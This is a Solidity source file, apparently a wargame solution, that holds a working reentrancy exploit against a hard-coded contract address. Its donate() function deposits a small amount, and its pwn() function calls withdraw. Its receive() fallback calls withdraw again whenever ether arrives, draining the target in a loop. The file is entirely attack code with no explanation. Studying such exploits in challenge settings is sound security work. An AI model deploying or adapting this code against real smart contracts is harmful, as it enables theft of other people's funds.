// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract EntrantsOnly {
    function donate() public {
        0x89F4e4D42d23303E25187550d36DaC786F8E9B2D.call{
            value: 1000000000000000
        }(abi.encodeWithSignature("donate(address)", address(this)));
    }

    function pwn() public {
        0x89F4e4D42d23303E25187550d36DaC786F8E9B2D.call(
            abi.encodeWithSignature("withdraw(uint256)", 1000000000000000)
        );
    }

    receive() external payable {
        0x89F4e4D42d23303E25187550d36DaC786F8E9B2D.call(
            abi.encodeWithSignature("withdraw(uint256)", 1000000000000000)
        );
    }
}
